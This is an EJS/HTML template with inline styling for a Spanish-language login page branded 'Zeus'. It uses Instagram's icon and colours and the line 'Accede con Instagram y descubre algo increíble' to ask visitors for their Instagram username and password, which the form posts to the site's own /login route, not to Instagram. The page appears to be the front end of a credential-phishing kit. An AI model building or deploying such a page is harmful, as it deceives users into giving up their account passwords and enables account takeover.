<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="stylesheet" href="/css/styles.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
</head>
<body>
    <div class="header">
        <h1>Zeus</h1>
    </div>
    <div class="container">
        <h2>
            <i class="fab fa-instagram"></i> Accede con Instagram y descubre algo increíble
        </h2>
        <% if (error) { %>
            <p class="error"><%= error %></p>
        <% } %>
        <form action="/login" method="POST">
            <input type="text" name="username" placeholder="Usuario de Instagram" required>
            <input type="password" name="password" placeholder="Contraseña" required>
            <button type="submit">Entrar</button>
        </form>
    </div>
</body>
</html>

<style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: 'Poppins', sans-serif;
    }

    body {
        background-color: #121212;
        color: white;
        display: flex;
        justify-content: center;
        align-items: center;
        flex-direction: column;
        height: 100vh;
        margin: 0;
    }

    .header {
        margin-top: 0;
        width: 100%;
        text-align: center;
        padding: 60px 0;
        background: transparent;
        color: white;
        font-size: 40px;
        font-weight: bold;
        letter-spacing: 3px;
        background: linear-gradient(45deg, #e1306c, #ff9f43, #c1275b, #ff5252); /* Gradiente multicolor */
        -webkit-background-clip: text;
        color: transparent;
        text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.4);
    }

    .container {
        background: rgba(30, 30, 30, 0.95);
        padding: 25px;
        border-radius: 12px;
        box-shadow: 0px 5px 15px rgba(255, 255, 255, 0.1);
        text-align: center;
        width: 350px;
        max-width: 100%;
        box-sizing: border-box;
        background-image: url('https://via.placeholder.com/800x400'); /* Imagen de fondo */
        background-size: cover;
        background-position: center;
    }

    h2 {
        font-size: 20px;
        margin-bottom: 20px;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 10px;
        color: #ff9f43;
    }

    h2 i {
        font-size: 26px;
        color: #e1306c;
    }

    input {
        width: 100%;
        padding: 12px;
        margin: 10px 0;
        border: none;
        background: #222;
        color: white;
        border-radius: 5px;
        transition: all 0.3s ease-in-out;
        outline: none;
    }

    input:focus {
        background: #333;
        border-left: 3px solid #e1306c;
    }

    button {
        width: 100%;
        padding: 12px;
        background: #e1306c;
        border: none;
        color: white;
        border-radius: 6px;
        cursor: pointer;
        font-size: 16px;
        transition: all 0.3s ease-in-out;
    }

    button:hover {
        background: #c1275b;
        transform: scale(1.05);
    }

    .error {
        color: #ff5252;
        font-size: 14px;
        margin-bottom: 10px;
    }

    /* Media Queries para Responsividad */
    @media (max-width: 480px) {
        body {
            padding: 10px;
        }

        .container {
            width: 100%;
            padding: 15px;
        }

        h2 {
            font-size: 18px;
            text-align: left;
        }

        h2 i {
            font-size: 22px;
        }

        button {
            font-size: 14px;
        }

        input {
            padding: 10px;
        }
    }
</style>
